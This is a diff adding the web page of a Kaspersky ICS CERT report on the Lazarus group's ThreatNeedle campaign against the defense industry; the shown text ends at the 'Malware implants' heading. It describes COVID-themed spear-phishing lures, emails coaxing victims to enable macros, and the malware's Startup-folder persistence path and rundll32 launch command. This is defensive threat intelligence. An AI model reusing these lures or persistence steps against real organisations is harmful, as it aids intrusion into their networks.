@@ -1,0 +1,1127 @@
+<!DOCTYPE html>
+<html lang="en-US">
+	<head>
+
+		<meta charset="UTF-8">
+		<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+		<meta name="viewport" content="initial-scale=1.0,maximum-scale=1.0,user-scalable=no" />
+
+		<link rel="apple-touch-icon" sizes="180x180" href="https://ics-cert.kaspersky.com/wp-content/themes/ics_theme/apple-touch-icon.png">
+		<link rel="icon" type="image/png" sizes="32x32" href="https://ics-cert.kaspersky.com/wp-content/themes/ics_theme/favicon-32x32.png">
+		<link rel="icon" type="image/png" sizes="16x16" href="https://ics-cert.kaspersky.com/wp-content/themes/ics_theme/favicon-16x16.png">
+		<link rel="manifest" href="https://ics-cert.kaspersky.com/wp-content/themes/ics_theme/manifest.json">
+		<link rel="mask-icon" href="https://ics-cert.kaspersky.com/wp-content/themes/ics_theme/safari-pinned-tab.svg" color="#5bbad5">
+		<meta name="theme-color" content="#ffffff">
+		<meta name="msapplication-config" content="https://ics-cert.kaspersky.com/wp-content/themes/ics_theme/browserconfig.xml" />
+		
+					<!-- <meta property="og:image"  content="https://ics-cert.kaspersky.com/wp-content/themes/ics_theme/assets/picture/ics_cert_400x400_for_og.png" /> -->
+				<meta name="SKYPE_TOOLBAR" content="SKYPE_TOOLBAR_PARSER_COMPATIBLE"/>
+
+		<title>Lazarus targets defense industry with ThreatNeedle | Kaspersky ICS CERT</title>
+
+		<!-- All in One SEO 4.1.1.1 -->
+		<link rel="canonical" href="https://ics-cert.kaspersky.com/reports/2021/02/25/lazarus-targets-defense-industry-with-threatneedle/" />
+		<meta property="og:site_name" content="Kaspersky ICS CERT | Kaspersky Industrial Control Systems Cyber Emergency Response Team" />
+		<meta property="og:type" content="article" />
+		<meta property="og:title" content="Lazarus targets defense industry with ThreatNeedle | Kaspersky ICS CERT" />
+		<meta property="og:description" content="In mid-2020, we realized that Lazarus was launching attacks on the defense industry using the ThreatNeedle cluster, an advanced malware cluster of Manuscrypt (a.k.a. NukeSped). While investigating this activity, we were able to observe the complete life cycle of an attack, uncovering more technical details and links to the group’s other campaigns." />
+		<meta property="og:url" content="https://ics-cert.kaspersky.com/reports/2021/02/25/lazarus-targets-defense-industry-with-threatneedle/" />
+		<meta property="og:image" content="https://ics-cert.kaspersky.com/wp-content/uploads/sites/6/2021/02/ics_cert_400x400_for_og.png" />
+		<meta property="og:image:secure_url" content="https://ics-cert.kaspersky.com/wp-content/uploads/sites/6/2021/02/ics_cert_400x400_for_og.png" />
+		<meta property="og:image:width" content="400" />
+		<meta property="og:image:height" content="400" />
+		<meta property="article:published_time" content="2021-02-25T10:00:00Z" />
+		<meta property="article:modified_time" content="2021-03-01T11:25:45Z" />
+		<meta name="twitter:card" content="summary" />
+		<meta name="twitter:domain" content="ics-cert.kaspersky.com" />
+		<meta name="twitter:title" content="Lazarus targets defense industry with ThreatNeedle | Kaspersky ICS CERT" />
+		<meta name="twitter:description" content="In mid-2020, we realized that Lazarus was launching attacks on the defense industry using the ThreatNeedle cluster, an advanced malware cluster of Manuscrypt (a.k.a. NukeSped). While investigating this activity, we were able to observe the complete life cycle of an attack, uncovering more technical details and links to the group’s other campaigns." />
+		<meta name="twitter:image" content="https://ics-cert.kaspersky.com/wp-content/uploads/sites/6/2021/02/ics_cert_400x400_for_og.png" />
+		<script type="application/ld+json" class="aioseo-schema">
+			{"@context":"https:\/\/schema.org","@graph":[{"@type":"WebSite","@id":"https:\/\/ics-cert.kaspersky.com\/#website","url":"https:\/\/ics-cert.kaspersky.com\/","name":"Kaspersky ICS CERT","description":"Kaspersky Industrial Control Systems Cyber Emergency Response Team","publisher":{"@id":"https:\/\/ics-cert.kaspersky.com\/#organization"}},{"@type":"Organization","@id":"https:\/\/ics-cert.kaspersky.com\/#organization","name":"Kaspersky ICS CERT","url":"https:\/\/ics-cert.kaspersky.com\/"},{"@type":"BreadcrumbList","@id":"https:\/\/ics-cert.kaspersky.com\/reports\/2021\/02\/25\/lazarus-targets-defense-industry-with-threatneedle\/#breadcrumblist","itemListElement":[{"@type":"ListItem","@id":"https:\/\/ics-cert.kaspersky.com\/#listItem","position":"1","item":{"@id":"https:\/\/ics-cert.kaspersky.com\/#item","name":"Home","description":"Kaspersky Industrial Control Systems Cyber Emergency Response Team","url":"https:\/\/ics-cert.kaspersky.com\/"},"nextItem":"https:\/\/ics-cert.kaspersky.com\/reports\/#listItem"},{"@type":"ListItem","@id":"https:\/\/ics-cert.kaspersky.com\/reports\/#listItem","position":"2","item":{"@id":"https:\/\/ics-cert.kaspersky.com\/reports\/#item","name":"Reports","url":"https:\/\/ics-cert.kaspersky.com\/reports\/"},"nextItem":"https:\/\/ics-cert.kaspersky.com\/reports\/2021\/#listItem","previousItem":"https:\/\/ics-cert.kaspersky.com\/#listItem"},{"@type":"ListItem","@id":"https:\/\/ics-cert.kaspersky.com\/reports\/2021\/#listItem","position":"3","item":{"@id":"https:\/\/ics-cert.kaspersky.com\/reports\/2021\/#item","name":"2021","url":"https:\/\/ics-cert.kaspersky.com\/reports\/2021\/"},"nextItem":"https:\/\/ics-cert.kaspersky.com\/reports\/2021\/02\/#listItem","previousItem":"https:\/\/ics-cert.kaspersky.com\/reports\/#listItem"},{"@type":"ListItem","@id":"https:\/\/ics-cert.kaspersky.com\/reports\/2021\/02\/#listItem","position":"4","item":{"@id":"https:\/\/ics-cert.kaspersky.com\/reports\/2021\/02\/#item","name":"February","url":"https:\/\/ics-cert.kaspersky.com\/reports\/2021\/02\/"},"nextItem":"https:\/\/ics-cert.kaspersky.com\/reports\/2021\/02\/25\/#listItem","previousItem":"https:\/\/ics-cert.kaspersky.com\/reports\/2021\/#listItem"},{"@type":"ListItem","@id":"https:\/\/ics-cert.kaspersky.com\/reports\/2021\/02\/25\/#listItem","position":"5","item":{"@id":"https:\/\/ics-cert.kaspersky.com\/reports\/2021\/02\/25\/#item","name":"25","url":"https:\/\/ics-cert.kaspersky.com\/reports\/2021\/02\/25\/"},"nextItem":"https:\/\/ics-cert.kaspersky.com\/reports\/2021\/02\/25\/lazarus-targets-defense-industry-with-threatneedle\/#listItem","previousItem":"https:\/\/ics-cert.kaspersky.com\/reports\/2021\/02\/#listItem"},{"@type":"ListItem","@id":"https:\/\/ics-cert.kaspersky.com\/reports\/2021\/02\/25\/lazarus-targets-defense-industry-with-threatneedle\/#listItem","position":"6","item":{"@id":"https:\/\/ics-cert.kaspersky.com\/reports\/2021\/02\/25\/lazarus-targets-defense-industry-with-threatneedle\/#item","name":"Lazarus targets defense industry with ThreatNeedle","url":"https:\/\/ics-cert.kaspersky.com\/reports\/2021\/02\/25\/lazarus-targets-defense-industry-with-threatneedle\/"},"previousItem":"https:\/\/ics-cert.kaspersky.com\/reports\/2021\/02\/25\/#listItem"}]},{"@type":"Person","@id":"https:\/\/ics-cert.kaspersky.com\/author\/gridasovdanil\/#author","url":"https:\/\/ics-cert.kaspersky.com\/author\/gridasovdanil\/","name":"gridasovdanil","image":{"@type":"ImageObject","@id":"https:\/\/ics-cert.kaspersky.com\/reports\/2021\/02\/25\/lazarus-targets-defense-industry-with-threatneedle\/#authorImage","url":"https:\/\/secure.gravatar.com\/avatar\/fa1340bbe4df5edd42b5b4bb7740b06b?s=96&d=mm&r=g","width":"96","height":"96","caption":"gridasovdanil"}},{"@type":"WebPage","@id":"https:\/\/ics-cert.kaspersky.com\/reports\/2021\/02\/25\/lazarus-targets-defense-industry-with-threatneedle\/#webpage","url":"https:\/\/ics-cert.kaspersky.com\/reports\/2021\/02\/25\/lazarus-targets-defense-industry-with-threatneedle\/","name":"Lazarus targets defense industry with ThreatNeedle | Kaspersky ICS CERT","inLanguage":"en-US","isPartOf":{"@id":"https:\/\/ics-cert.kaspersky.com\/#website"},"breadcrumb":{"@id":"https:\/\/ics-cert.kaspersky.com\/reports\/2021\/02\/25\/lazarus-targets-defense-industry-with-threatneedle\/#breadcrumblist"},"author":"https:\/\/ics-cert.kaspersky.com\/reports\/2021\/02\/25\/lazarus-targets-defense-industry-with-threatneedle\/#author","creator":"https:\/\/ics-cert.kaspersky.com\/reports\/2021\/02\/25\/lazarus-targets-defense-industry-with-threatneedle\/#author","datePublished":"2021-02-25T10:00:00+03:00","dateModified":"2021-03-01T11:25:45+03:00"},{"@type":"Article","@id":"https:\/\/ics-cert.kaspersky.com\/reports\/2021\/02\/25\/lazarus-targets-defense-industry-with-threatneedle\/#article","name":"Lazarus targets defense industry with ThreatNeedle | Kaspersky ICS CERT","headline":"Lazarus targets defense industry with ThreatNeedle","author":{"@id":"https:\/\/ics-cert.kaspersky.com\/author\/gridasovdanil\/#author"},"publisher":{"@id":"https:\/\/ics-cert.kaspersky.com\/#organization"},"datePublished":"2021-02-25T10:00:00+03:00","dateModified":"2021-03-01T11:25:45+03:00","articleSection":"Reports, COVID-19, Lazarus, ThreatNeedle","mainEntityOfPage":{"@id":"https:\/\/ics-cert.kaspersky.com\/reports\/2021\/02\/25\/lazarus-targets-defense-industry-with-threatneedle\/#webpage"},"isPartOf":{"@id":"https:\/\/ics-cert.kaspersky.com\/reports\/2021\/02\/25\/lazarus-targets-defense-industry-with-threatneedle\/#webpage"},"image":{"@type":"ImageObject","@id":"https:\/\/ics-cert.kaspersky.com\/#articleImage","url":"https:\/\/ics-cert.kaspersky.com\/wp-content\/uploads\/sites\/6\/2021\/02\/210225-lazarus-threatneedle-01.png","width":"1254","height":"739"}}]}
+		</script>
+		<!-- All in One SEO -->
+
+<link rel='dns-prefetch' href='//s.w.org' />
+<link rel="alternate" type="application/rss+xml" title="Kaspersky ICS CERT &raquo; Lazarus targets defense industry with ThreatNeedle Comments Feed" href="https://ics-cert.kaspersky.com/reports/2021/02/25/lazarus-targets-defense-industry-with-threatneedle/feed/" />
+		<script type="text/javascript">
+			window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/13.0.1\/72x72\/","ext":".png","svgUrl":"https:\/\/s.w.org\/images\/core\/emoji\/13.0.1\/svg\/","svgExt":".svg","source":{"concatemoji":"https:\/\/ics-cert.kaspersky.com\/wp-includes\/js\/wp-emoji-release.min.js?ver=5.7.2"}};
+			!function(e,a,t){var n,r,o,i=a.createElement("canvas"),p=i.getContext&&i.getContext("2d");function s(e,t){var a=String.fromCharCode;p.clearRect(0,0,i.width,i.height),p.fillText(a.apply(this,e),0,0);e=i.toDataURL();return p.clearRect(0,0,i.width,i.height),p.fillText(a.apply(this,t),0,0),e===i.toDataURL()}function c(e){var t=a.createElement("script");t.src=e,t.defer=t.type="text/javascript",a.getElementsByTagName("head")[0].appendChild(t)}for(o=Array("flag","emoji"),t.supports={everything:!0,everythingExceptFlag:!0},r=0;r<o.length;r++)t.supports[o[r]]=function(e){if(!p||!p.fillText)return!1;switch(p.textBaseline="top",p.font="600 32px Arial",e){case"flag":return s([127987,65039,8205,9895,65039],[127987,65039,8203,9895,65039])?!1:!s([55356,56826,55356,56819],[55356,56826,8203,55356,56819])&&!s([55356,57332,56128,56423,56128,56418,56128,56421,56128,56430,56128,56423,56128,56447],[55356,57332,8203,56128,56423,8203,56128,56418,8203,56128,56421,8203,56128,56430,8203,56128,56423,8203,56128,56447]);case"emoji":return!s([55357,56424,8205,55356,57212],[55357,56424,8203,55356,57212])}return!1}(o[r]),t.supports.everything=t.supports.everything&&t.supports[o[r]],"flag"!==o[r]&&(t.supports.everythingExceptFlag=t.supports.everythingExceptFlag&&t.supports[o[r]]);t.supports.everythingExceptFlag=t.supports.everythingExceptFlag&&!t.supports.flag,t.DOMReady=!1,t.readyCallback=function(){t.DOMReady=!0},t.supports.everything||(n=function(){t.readyCallback()},a.addEventListener?(a.addEventListener("DOMContentLoaded",n,!1),e.addEventListener("load",n,!1)):(e.attachEvent("onload",n),a.attachEvent("onreadystatechange",function(){"complete"===a.readyState&&t.readyCallback()})),(n=t.source||{}).concatemoji?c(n.concatemoji):n.wpemoji&&n.twemoji&&(c(n.twemoji),c(n.wpemoji)))}(window,document,window._wpemojiSettings);
+		</script>
+		<style type="text/css">
+img.wp-smiley,
+img.emoji {
+	display: inline !important;
+	border: none !important;
+	box-shadow: none !important;
+	height: 1em !important;
+	width: 1em !important;
+	margin: 0 .07em !important;
+	vertical-align: -0.1em !important;
+	background: none !important;
+	padding: 0 !important;
+}
+</style>
+	<link rel='stylesheet' id='wp-block-library-css'  href='https://ics-cert.kaspersky.com/wp-includes/css/dist/block-library/style.min.css?ver=5.7.2' type='text/css' media='all' />
+<link rel='stylesheet' id='enlighterjs-css'  href='https://ics-cert.kaspersky.com/wp-content/plugins/enlighter/cache/X6_enlighterjs.min.css?ver=DybqQ/EH2HuUsHG' type='text/css' media='all' />
+<script type='text/javascript' src='https://ics-cert.kaspersky.com/wp-includes/js/jquery/jquery-3.4.1.min.js?ver=3.4.1' id='jquery-js'></script>
+<script type='text/javascript' src='https://ics-cert.kaspersky.com/wp-includes/js/jquery/jquery-migrate-3.0.1.min.js?ver=3.0.1' id='jquery-migrate-js'></script>
+<link rel="https://api.w.org/" href="https://ics-cert.kaspersky.com/wp-json/" /><link rel="alternate" type="application/json" href="https://ics-cert.kaspersky.com/wp-json/wp/v2/posts/3636" /><link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://ics-cert.kaspersky.com/xmlrpc.php?rsd" />
+<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="https://ics-cert.kaspersky.com/wp-includes/wlwmanifest.xml" /> 
+<meta name="generator" content="WordPress 5.7.2" />
+<link rel='shortlink' href='https://ics-cert.kaspersky.com/?p=3636' />
+<link rel="alternate" type="application/json+oembed" href="https://ics-cert.kaspersky.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fics-cert.kaspersky.com%2Freports%2F2021%2F02%2F25%2Flazarus-targets-defense-industry-with-threatneedle%2F" />
+<link rel="alternate" type="text/xml+oembed" href="https://ics-cert.kaspersky.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fics-cert.kaspersky.com%2Freports%2F2021%2F02%2F25%2Flazarus-targets-defense-industry-with-threatneedle%2F&#038;format=xml" />
+      <meta name="onesignal" content="wordpress-plugin"/>
+            <script>
+
+      window.OneSignal = window.OneSignal || [];
+
+      OneSignal.push( function() {
+        OneSignal.SERVICE_WORKER_UPDATER_PATH = "OneSignalSDKUpdaterWorker.js.php";
+                      OneSignal.SERVICE_WORKER_PATH = "OneSignalSDKWorker.js.php";
+                      OneSignal.SERVICE_WORKER_PARAM = { scope: "/" };
+        OneSignal.setDefaultNotificationUrl("https://ics-cert.kaspersky.com");
+        var oneSignal_options = {};
+        window._oneSignalInitOptions = oneSignal_options;
+
+        oneSignal_options['wordpress'] = true;
+oneSignal_options['appId'] = '422be36b-503e-4627-a36f-992622a95746';
+oneSignal_options['allowLocalhostAsSecureOrigin'] = true;
+oneSignal_options['welcomeNotification'] = { };
+oneSignal_options['welcomeNotification']['disable'] = true;
+oneSignal_options['path'] = "https://ics-cert.kaspersky.com/wp-content/plugins/onesignal-free-web-push-notifications/sdk_files/";
+oneSignal_options['promptOptions'] = { };
+                OneSignal.init(window._oneSignalInitOptions);
+                OneSignal.showSlidedownPrompt();      });
+
+      function documentInitOneSignal() {
+        var oneSignal_elements = document.getElementsByClassName("OneSignal-prompt");
+
+        var oneSignalLinkClickHandler = function(event) { OneSignal.push(['registerForPushNotifications']); event.preventDefault(); };        for(var i = 0; i < oneSignal_elements.length; i++)
+          oneSignal_elements[i].addEventListener('click', oneSignalLinkClickHandler, false);
+      }
+
+      if (document.readyState === 'complete') {
+           documentInitOneSignal();
+      }
+      else {
+           window.addEventListener("load", function(event){
+               documentInitOneSignal();
+          });
+      }
+    </script>
+<link rel="icon" href="https://ics-cert.kaspersky.com/wp-content/uploads/sites/6/2019/10/cropped-android-chrome-256x256-32x32.png" sizes="32x32" />
+<link rel="icon" href="https://ics-cert.kaspersky.com/wp-content/uploads/sites/6/2019/10/cropped-android-chrome-256x256-192x192.png" sizes="192x192" />
+<link rel="apple-touch-icon" href="https://ics-cert.kaspersky.com/wp-content/uploads/sites/6/2019/10/cropped-android-chrome-256x256-180x180.png" />
+<meta name="msapplication-TileImage" content="https://ics-cert.kaspersky.com/wp-content/uploads/sites/6/2019/10/cropped-android-chrome-256x256-270x270.png" />
+
+		<link href="https://ics-cert.kaspersky.com/wp-content/themes/ics_theme/assets/css/main.css?v=1.68" rel="stylesheet" type="text/css" />
+			</head>
+
+	<body class="body">
+		<header class="header header--no-main">
+			<div class="row header_firstline">
+				<div class="header_inner">
+											<a class="header_logo" href="https://ics-cert.kaspersky.com" title="Kaspersky ICS CERT">
+							<img class="header_logo-img" src="https://ics-cert.kaspersky.com/wp-content/themes/ics_theme/assets/picture/logo-2.png?v=2" alt="Kaspersky ICS CERT" title="Kaspersky ICS CERT" />
+						</a>
+					
+																	<a href="https://ics-cert.kaspersky.ru/" class="header_lang header_lang--ru">РУ</a>
+															</div>
+			</div>
+			
+			
+												<nav class="row header_navbar">
+						<div class="header_inner">
+							<ul class="header_list-links">
+																	<li class="header_list-item">
+										<a class="header_link" href="https://ics-cert.kaspersky.com/services/" title="Services">Services</a>
+									</li>
+																	<li class="header_list-item">
+										<a class="header_link" href="https://ics-cert.kaspersky.com/category/alerts/" title="Alerts">Alerts</a>
+									</li>
+																	<li class="header_list-item">
+										<a class="header_link" href="https://ics-cert.kaspersky.com/category/reports/" title="Reports">Reports</a>
+									</li>
+																	<li class="header_list-item">
+										<a class="header_link" href="https://ics-cert.kaspersky.com/contacts/" title="Contacts">Contacts</a>
+									</li>
+															</ul>
+						</div>
+					</nav>
+									</header>	<div class="content">
+		<div class="content_inner">
+			<div class="content_breadcrumbs"><a class="content_breadcrumbs-link" href="https://ics-cert.kaspersky.com" class="content_breadcrumbs-link">Home</a> / <a href="https://ics-cert.kaspersky.com/category/reports/" class="content_breadcrumbs-link">Reports</a> / <span class="content_breadcrumbs--grey">Lazarus targets defense industry with ThreatNeedle</span></div>
+			<h1 class="content_title">Lazarus targets defense industry with ThreatNeedle</h1>
+			
+				<div class="two-columns_wrapper two-columns_wrapper--d-block">
+		<div class="two-columns_info two-columns_info--d-inline-block">
+			<div class="two-columns_info-inner">
+				<article class="content_text">
+					<div class="content_blog-header">
+																			<a class="content_blog-link -pdf" href="/media/Kaspersky-ICS-CERT-Lazarus-targets-defense-industry-with-Threatneedle-En.pdf" target="_blank">Download PDF version</a>
+												<time class="content_blog-time" datetime="2021-02-25">25 February 2021</time>
+					</div>
+										
+<ul><li><a href="#_Toc64638316">Initial infection</a></li> <li><a href="#_Toc64638317">Malware implants</a></li>   <ul>   <li><a href="#_Toc64638318">ThreatNeedle installer</a></li>   <li><a href="#_Toc64638319">ThreatNeedle loader</a></li>   <li><a href="#_Toc64638320">ThreatNeedle backdoor</a></li>   </ul> <li><a href="#_Toc64638321">Post-exploitation phase</a></li>   <ul>   <li><a href="#_Toc64638322">Credential gathering</a></li>   <li><a href="#_Toc64638323">Lateral movement</a></li>   <li><a href="#_Toc64638324">Overcoming network segmentation</a></li>   <li><a href="#_Toc64638325">Exfiltration</a></li>   </ul> <li><a href="#_Toc64638326">Attribution</a></li>   <ul>   <li><a href="#_Toc64638327">Connection with DeathNote cluster</a></li>   <li><a href="#_Toc64638328">Connection with Operation AppleJeus</a></li>   <li><a href="#_Toc64638329">Connection with Bookcode cluster</a></li>   </ul> <li><a href="#_Toc64638330">Conclusions</a></li> <li><a href="#_Toc64638331">Appendix I – Indicators of Compromise</a></li> <li><a href="#_Toc64638332">Appendix II – MITRE ATT&amp;CK Mapping</a></li> </ul><br><br>
+
+
+
+<p>We named Lazarus the most active group of 2020. We’ve observed numerous activities by this notorious APT group targeting various industries. The group has changed target depending on the primary objective. Google TAG <a href="https://blog.google/threat-analysis-group/new-campaign-targeting-security-researchers/" target="_blank" rel="noreferrer noopener" title="https://blog.google/threat-analysis-group/new-campaign-targeting-security-researchers/">has recently published a post</a> about a campaign by Lazarus targeting security researchers. After taking a closer look, we identified the malware used in those attacks as belonging to a family that we call ThreatNeedle. We have seen Lazarus attack various industries using this malware cluster before. In mid-2020, we realized that Lazarus was launching attacks on the defense industry using the ThreatNeedle cluster, an advanced malware cluster of Manuscrypt (a.k.a. NukeSped). While investigating this activity, we were able to observe the complete life cycle of an attack, uncovering more technical details and links to the group’s other campaigns.</p>
+
+
+
+<p>The group made use of COVID-19 themes in its spear-phishing emails, embellishing them with personal information gathered using publicly available sources. After gaining an initial foothold, the attackers gathered credentials and moved laterally, seeking crucial assets in the victim environment. We observed how they overcame network segmentation by gaining access to an internal router machine and configuring it as a proxy server, allowing them to exfiltrate stolen data from the intranet network to their remote server. So far organizations in more than a dozen countries have been affected.</p>
+
+
+
+<p>During this investigation we had a chance to look into the command-and-control infrastructure. The attackers configured multiple C2 servers for various stages, reusing several scripts we’ve seen in previous attacks by the group. Moreover, based on the insights so far, it was possible to figure out the relationship with other Lazarus group campaigns.</p>
+
+
+
+<p>The full article is available on <a href="https://www.kaspersky.com/enterprise-security/threat-intelligence" target="_blank" rel="noreferrer noopener">Kaspersky Threat Intelligence</a>. Customers of Kaspersky Intelligence reporting may contact: <a href="mailto:intelreports@kaspersky.com">intelreports@kaspersky.com</a><br>For more information please contact: <a href="mailto:ics-cert@kaspersky.com" target="_blank" rel="noreferrer noopener">ics-cert@kaspersky.com</a><strong>.</strong><br></p>
+
+
+
+<h2 id="_Toc64638316">Initial infection</h2>
+
+
+
+<p>In this attack, spear phishing was used as the initial infection vector. Before launching the attack, the group studied publicly available information about the targeted organization and identified email addresses belonging to various departments of the company.</p>
+
+
+
+<p>Email addresses in those departments received phishing emails that either had a malicious Word document attached or a link to one hosted on a remote server. The phishing emails claimed to have urgent updates on today’s hottest topic – COVID-19 infections. The phishing emails were carefully crafted and written on behalf of a medical center that is part of the organization under attack.</p>
+
+
+
+<figure class="wp-block-image size-full"><a class="light-box" href="https://ics-cert.kaspersky.com/wp-content/uploads/sites/6/2021/02/210225-lazarus-threatneedle-01.png"><img loading="lazy" width="1254" height="739" src="https://ics-cert.kaspersky.com/wp-content/uploads/sites/6/2021/02/210225-lazarus-threatneedle-01.png" alt="" class="wp-image-3648" srcset="https://ics-cert.kaspersky.com/wp-content/uploads/sites/6/2021/02/210225-lazarus-threatneedle-01.png 1254w, https://ics-cert.kaspersky.com/wp-content/uploads/sites/6/2021/02/210225-lazarus-threatneedle-01-300x177.png 300w, https://ics-cert.kaspersky.com/wp-content/uploads/sites/6/2021/02/210225-lazarus-threatneedle-01-1024x603.png 1024w, https://ics-cert.kaspersky.com/wp-content/uploads/sites/6/2021/02/210225-lazarus-threatneedle-01-768x453.png 768w" sizes="(max-width: 1254px) 100vw, 1254px" /></a><figcaption><em>Phishing email with links to malicious documents</em></figcaption></figure>
+
+
+
+<p>The attackers registered accounts with a public email service, making sure the sender’s email addresses looked similar to the medical center’s real email address. The signature shown in the phishing emails included the actual personal data of the deputy head doctor of the attacked organization’s medical center. The attackers were able to find this information on the medical center’s public website.</p>
+
+
+
+<p>A macro in the Microsoft Word document contained the malicious code designed to download and execute additional malicious software on the infected system.</p>
+
+
+
+<p>The document contains information on the population health assessment program and is not directly related to the subject of the phishing email (COVID-19), suggesting the attackers may not completely understand the meaning of the contents they used.</p>
+
+
+
+<figure class="wp-block-image size-full"><a class="light-box" href="https://ics-cert.kaspersky.com/wp-content/uploads/sites/6/2021/02/210225-lazarus-threatneedle-02.png"><img loading="lazy" width="800" height="600" src="https://ics-cert.kaspersky.com/wp-content/uploads/sites/6/2021/02/210225-lazarus-threatneedle-02.png" alt="" class="wp-image-3656" srcset="https://ics-cert.kaspersky.com/wp-content/uploads/sites/6/2021/02/210225-lazarus-threatneedle-02.png 800w, https://ics-cert.kaspersky.com/wp-content/uploads/sites/6/2021/02/210225-lazarus-threatneedle-02-300x225.png 300w, https://ics-cert.kaspersky.com/wp-content/uploads/sites/6/2021/02/210225-lazarus-threatneedle-02-768x576.png 768w" sizes="(max-width: 800px) 100vw, 800px" /></a><figcaption><em>Contents of malicious document</em></figcaption></figure>
+
+
+
+<p>The content of the lure document was copied from an online post by a health clinic.</p>
+
+
+
+<p>Our investigation showed that the initial spear-phishing attempt was unsuccessful due to macros being disabled in the Microsoft Office installation of the targeted systems. In order to persuade the target to allow the malicious macro, the attacker sent another email showing how to enable macros in Microsoft Office.</p>
+
+
+
+<figure class="wp-block-image size-full"><a class="light-box" href="https://ics-cert.kaspersky.com/wp-content/uploads/sites/6/2021/02/210225-lazarus-threatneedle-03.png"><img loading="lazy" width="1245" height="718" src="https://ics-cert.kaspersky.com/wp-content/uploads/sites/6/2021/02/210225-lazarus-threatneedle-03.png" alt="" class="wp-image-3665" srcset="https://ics-cert.kaspersky.com/wp-content/uploads/sites/6/2021/02/210225-lazarus-threatneedle-03.png 1245w, https://ics-cert.kaspersky.com/wp-content/uploads/sites/6/2021/02/210225-lazarus-threatneedle-03-300x173.png 300w, https://ics-cert.kaspersky.com/wp-content/uploads/sites/6/2021/02/210225-lazarus-threatneedle-03-1024x591.png 1024w, https://ics-cert.kaspersky.com/wp-content/uploads/sites/6/2021/02/210225-lazarus-threatneedle-03-768x443.png 768w" sizes="(max-width: 1245px) 100vw, 1245px" /></a><figcaption><em>Email with instructions on enabling macros #1</em></figcaption></figure>
+
+
+
+<p>After sending the above email with explanations, the attackers realized that the target was using a different version of Microsoft Office and therefore required a different procedure for enabling macros. The attackers subsequently sent another email showing the correct procedure in a screenshot with a Russian language pack.</p>
+
+
+
+<figure class="wp-block-image size-full"><a class="light-box" href="https://ics-cert.kaspersky.com/wp-content/uploads/sites/6/2021/02/210225-lazarus-threatneedle-04.png"><img loading="lazy" width="858" height="656" src="https://ics-cert.kaspersky.com/wp-content/uploads/sites/6/2021/02/210225-lazarus-threatneedle-04.png" alt="" class="wp-image-3669" srcset="https://ics-cert.kaspersky.com/wp-content/uploads/sites/6/2021/02/210225-lazarus-threatneedle-04.png 858w, https://ics-cert.kaspersky.com/wp-content/uploads/sites/6/2021/02/210225-lazarus-threatneedle-04-300x229.png 300w, https://ics-cert.kaspersky.com/wp-content/uploads/sites/6/2021/02/210225-lazarus-threatneedle-04-768x587.png 768w" sizes="(max-width: 858px) 100vw, 858px" /></a><figcaption><em>Email with instructions on enabling macros #2</em></figcaption></figure>
+
+
+
+<p>The content in the spear-phishing emails sent by the attackers from May 21 to May 26, 2020, did not contain any grammatical mistakes. However, in subsequent emails the attackers made numerous errors, suggesting they may not be native Russian speakers and were using translation tools.</p>
+
+
+
+<figure class="wp-block-image size-full"><a class="light-box" href="https://ics-cert.kaspersky.com/wp-content/uploads/sites/6/2021/02/210225-lazarus-threatneedle-05.png"><img loading="lazy" width="697" height="352" src="https://ics-cert.kaspersky.com/wp-content/uploads/sites/6/2021/02/210225-lazarus-threatneedle-05.png" alt="" class="wp-image-3672" srcset="https://ics-cert.kaspersky.com/wp-content/uploads/sites/6/2021/02/210225-lazarus-threatneedle-05.png 697w, https://ics-cert.kaspersky.com/wp-content/uploads/sites/6/2021/02/210225-lazarus-threatneedle-05-300x152.png 300w" sizes="(max-width: 697px) 100vw, 697px" /></a><figcaption><em>Email containing several grammatical mistakes</em></figcaption></figure>
+
+
+
+<p>On June 3, 2020, one of the malicious attachments was opened by employees and at 9:30 am local time the attackers gained remote control of the infected system.</p>
+
+
+
+<p>This group also utilized different types of spear-phishing attack. One of the compromised hosts received several spear-phishing documents on May 19, 2020. The malicious file that was delivered, named Boeing_AERO_GS.docx, fetches a template from a remote server.</p>
+
+
+
+<p>However, no payload created by this malicious document could be discovered. We speculate that the infection from this malicious document failed for a reason unknown to us. A few days later, the same host opened a different malicious document. The threat actor wiped these files from disk after the initial infection meaning they could not be obtained.&nbsp;</p>
+
+
+
+<p>Nonetheless a related malicious document with this malware was retrieved based on our telemetry. It creates a payload and shortcut file and then continues executing the payload by using the following command line parameters.</p>
+
+
+
+<ul><li>Payload path: <code data-enlighter-language="raw" class="EnlighterJSRAW">%APPDATA%\Microsoft\Windows\lconcaches.db</code></li><li>Shortcut path: <code data-enlighter-language="raw" class="EnlighterJSRAW">%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\OneDrives.lnk</code></li><li>Command Line; please note that the string at the end is hard-coded, but different for each sample:<ul><li><code data-enlighter-language="raw" class="EnlighterJSRAW">rundll32.exe [dllpath],Dispatch n2UmQ9McxUds2b29</code></li></ul></li></ul>
+
+
+
+<p>The content of the decoy document depicts the job description of a generator/power industry engineer.</p>
+
+
+
+<figure class="wp-block-image size-full"><a class="light-box" href="https://ics-cert.kaspersky.com/wp-content/uploads/sites/6/2021/02/210225-lazarus-threatneedle-06.png"><img loading="lazy" width="1239" height="725" src="https://ics-cert.kaspersky.com/wp-content/uploads/sites/6/2021/02/210225-lazarus-threatneedle-06.png" alt="" class="wp-image-3675" srcset="https://ics-cert.kaspersky.com/wp-content/uploads/sites/6/2021/02/210225-lazarus-threatneedle-06.png 1239w, https://ics-cert.kaspersky.com/wp-content/uploads/sites/6/2021/02/210225-lazarus-threatneedle-06-300x176.png 300w, https://ics-cert.kaspersky.com/wp-content/uploads/sites/6/2021/02/210225-lazarus-threatneedle-06-1024x599.png 1024w, https://ics-cert.kaspersky.com/wp-content/uploads/sites/6/2021/02/210225-lazarus-threatneedle-06-768x449.png 768w" sizes="(max-width: 1239px) 100vw, 1239px" /></a><figcaption><em>Decoy document</em></figcaption></figure>
+
+
+
+<h2 id="_Toc64638317">Malware implants</h2>
+
+
+
